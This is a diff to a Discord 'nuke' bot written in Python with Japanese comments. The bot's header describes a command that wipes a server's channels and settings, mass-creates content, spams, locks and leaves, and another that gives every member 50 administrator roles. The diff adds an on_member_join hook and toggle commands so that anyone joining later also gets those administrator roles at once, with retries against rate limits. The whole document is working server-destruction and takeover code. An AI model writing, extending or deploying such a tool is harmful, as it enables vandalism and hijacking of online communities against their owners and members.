@@ -6,6 +6,9 @@
   !toishin  ->  全削除(ADMIN-xxは温存) → 設定破壊 → 大量生成
                 → 連投 → 施錠 → 退出
   !admin    ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
+                以後の新規参加者にも、参加した瞬間から同じロールを自動付与
+  !auto     ->  自動付与の状態確認
+  !autoadmin on|off ->  自動付与の手動ON/OFF
 ================================================================
   必要な環境変数: DISCORD_TOKEN
   必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
@@ -65,6 +68,7 @@ VERIF_HIGH       = True         # 認証レベル最高
 GUILD_ICON_URL   = None
 ADMIN_NOTIFY     = False
 ADMIN_ROLE_COUNT = 50
+ADMIN_AUTO_GRANT = True         # !admin 後、新規参加者にも自動で同じロールを即付与
 
 # ---- ウォッチドッグ ----
 NUKE_TIMEOUT     = 1200         # 秒。超えたら打ち切って即退出
@@ -269,6 +273,20 @@ bot = commands.Bot(
 
 NUKE_LOCK = asyncio.Lock()
 RETRY = {"delay": 30.0}
+
+# guild_id -> [ADMIN-xx のロール名, ...]
+# 名前で保持するので、ロールが作り直されても ID 変化に影響されない
+AUTO_GRANT: dict[int, list[str]] = {}
+AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
+
+
+def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
+    """記憶している名前から実ロールを引く (消えていれば無視)"""
+    names = AUTO_GRANT.get(guild.id)
+    if not names:
+        return []
+    wanted = set(names)
+    return [r for r in guild.roles if r.name in wanted]
 
 
 # ========================= ヌケ本体 =========================
@@ -607,7 +625,8 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
     guild = ctx.guild
     count = max(1, min(count, 200))
     t0 = time.perf_counter()
-    log.info("=== ADMIN START | %s (%s) | %d roles ===", guild.name, guild.id, count)
+    log.info("=== ADMIN START | %s (%s) | %d roles ===\n".replace("\n", ""),
+             guild.name, guild.id, count)
 
     members = await collect_members(guild)
     log.info("対象メンバー: %d 人 (member_count=%s)", len(members), guild.member_count)
@@ -622,6 +641,11 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
         log.warning("ロールを作成できなかった(Manage Roles 権限を確認)")
         await notify(ctx, "⚠ ロールを作成できなかった")
         return
+
+    # 以降の新規参加者を拾うため、ロールが揃った時点で自動付与を有効化
+    if ADMIN_AUTO_GRANT:
+        AUTO_GRANT[guild.id] = [r.name for r in roles]
+        log.info("自動付与を有効化: %d ロール (以降の参加者に即付与)", len(roles))
 
     top = guild.me.top_role
     above = [r for r in roles if r >= top]
@@ -648,6 +672,66 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
 
     await notify(ctx, f"✅ 全員に管理者ロール {len(roles)} 個を付与した "
                       f"(対象 {len(members)} 人 / 成功 {ok} 人)")
+    await notify(ctx, "🔁 以降の新規参加者にも同じロールを自動付与する")
+
+
+# ================= 新規参加者への自動付与 =================
+@bot.event
+async def on_member_join(member: discord.Member):
+    guild = member.guild
+    if not AUTO_GRANT.get(guild.id):
+        return
+
+    roles = resolve_auto_roles(guild)
+    if not roles:
+        log.warning("自動付与: ADMIN ロールが見つからない (guild=%s)", guild.id)
+        return
+
+    need = [r for r in roles if r not in member.roles]
+    if not need:
+        return
+
+    total = len(need)
+    async with AUTO_GRANT_SEM:
+        # 参加直後は 404 / 429 が出やすいので、残りが尽きるまで粘る
+        for attempt in range(1, 6):
+            await safe(member.add_roles, *need, atomic=True,
+                       reason="TOISHIN AUTO", label=f"autogrant:{member}")
+            need = [r for r in need if r not in member.roles]
+            if not need:
+                break
+            await asyncio.sleep(min(1.5 * attempt, 8))
+
+    if need:
+        log.warning("自動付与 未完了: %s (残り %d 個)", member, len(need))
+    else:
+        log.info("自動付与 完了: %s に %d 個", member, total)
+
+
+@bot.command(name="auto")
+@commands.guild_only()
+async def auto_cmd(ctx: commands.Context):
+    names = AUTO_GRANT.get(ctx.guild.id)
+    if not names:
+        await ctx.send("自動付与: OFF (先に !admin を実行)")
+        return
+    have = len(resolve_auto_roles(ctx.guild))
+    await ctx.send(f"自動付与: ON / 新規参加者に ADMIN ロール {have} 個を即付与")
+
+
+@bot.command(name="autoadmin")
+@commands.guild_only()
+async def autoadmin_cmd(ctx: commands.Context, mode: str = "on"):
+    if mode.lower() in ("off", "0", "false", "解除"):
+        AUTO_GRANT.pop(ctx.guild.id, None)
+        await ctx.send("自動付与 OFF")
+        return
+    roles = [r for r in ctx.guild.roles if is_admin_role(r)]
+    if not roles:
+        await ctx.send("ADMIN ロールが無い。!admin を先に")
+        return
+    AUTO_GRANT[ctx.guild.id] = [r.name for r in roles]
+    await ctx.send(f"自動付与 ON ({len(roles)} 個)")
 
 
 # =========================== おまけ ===========================
